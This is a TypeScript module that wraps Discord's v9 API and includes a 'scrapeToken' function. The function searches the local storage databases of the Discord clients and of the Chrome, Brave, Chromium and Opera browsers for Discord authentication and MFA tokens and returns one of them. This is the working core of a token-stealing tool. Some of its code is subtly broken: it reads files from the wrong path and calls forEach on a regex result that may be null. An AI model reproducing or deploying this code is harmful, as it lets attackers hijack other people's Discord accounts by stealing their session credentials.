import { request, RequestOptions } from "https";
import { type } from "os";
import { env } from "process";
import { readdirSync,readFileSync } from "fs";

class net {
  heartbeatc:number = 0;

  async sendApiReq(api:string, body:Buffer = Buffer.from(""), method:string = "GET", auth?:string):Promise<{status:{code:number,message:string},content:Buffer}> {
    if (body == null) body = Buffer.from("");
    if (method == null) method = "GET";
    if (auth == null) auth = undefined;

    let headers = {
      "User-Agent": "Mozilla/5.0 (Linux) Gecko/20100101 Firefox/89.0",
      "Accept": "*/*",
      "Accept-Language": "en-US",
      "Content-Type": "application/json",
      "Content-Length": body.length,
      "Authorization": `${auth ? auth : "undefined"}`
    };

    let options:RequestOptions = {
      "headers":headers,
      "method": method,
      "port": 443,
      "hostname":"discord.com",
      "path": `/api/v9/${api}`
    };

    return new Promise<{status:{code:number,message:string},content:Buffer}>((pres,prej) => {
      let req = request(options, res => {
        res.on("data", async (d) => {
          (await (async function() {return new Promise<void>((res,rej)=>{setTimeout(()=>{res()},1000)})})());
          pres({status:{code:res.statusCode,message:res.statusMessage},content:d});
        });
      });

      req.on("error", (e) => {
        console.error(e);
      });

      req.write(body);
      req.end();
    });
  }
  async heartbeatws(ws, heartbeat): Promise<void> {
    setInterval(() => {
      ws.send(JSON.stringify({op:1, d:this.heartbeatc}))
    },heartbeat);
  }
  updateheartbeatc(_new:number) {
    this.heartbeatc = _new;
  }
}

function scrapeToken():string {
  let local, roaming, config, paths;
  if (type().toLowerCase() == "nt") {
    local = env["LOCALAPPDATA"];
    roaming = env["APPDATA"];

    paths = {
      "Discord": `${roaming}\\Discord`,
      "Discord Canary": `${roaming}\\Discordcanary`,
      "Discord PTB": `${roaming}\\Discordptb`,
      "Google Chrome": `${local}\\Google\\Chrome\\User Data\\Default`,
      "Brave": `${local}\\BraveSoftware\\Brave-Browser\\User Data\\Default`
    }
  } else {
    config = `${env["HOME"]}/.config`;

    paths = {
      "Discord": `${config}/discord`,
      "Discord Canary": `${config}/discordcanary`,
      "Discord PTB": `${config}/discordptb`,
      "Google Chrome": `${config}/chrome/Default`,
      "Chromium": `${config}/chromium/Default`,
      "Brave": `${config}/BraveSoftware/Brave-Browser/Default`,
      "Opera": `${config}/opera`
    }
  }

  let tokens:{"name":string,"token":string}[] = [];

  for (let p in paths) {
    let op = p;

    paths[p] += "/Local Storage/leveldb";
    try {
      let d:string[] =readdirSync(paths[p]) 
      for (let _f in d) {
        let f = d[_f];
        if (!f.endsWith(".log") && !f.endsWith(".ldb")) continue;

        let x:string;
        let sa: string[] = readFileSync(`${p}/${f}`).toString().split("\n");
        for (x in sa) {
          x = sa[x];
          x.normalize();
          let tests:RegExp[] = [/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/, /mfa\.[\w-]{84}/]; 
          for (let test in tests) {
            tests[test].exec(x).forEach((token) => {
              tokens.push({"name":op,token});
            });
          }
        }
      }
    } catch {}
  };

  if (tokens.length < 1)
    return null;

  return tokens[0].token;
}

let _net = new net();

export { _net as net, scrapeToken };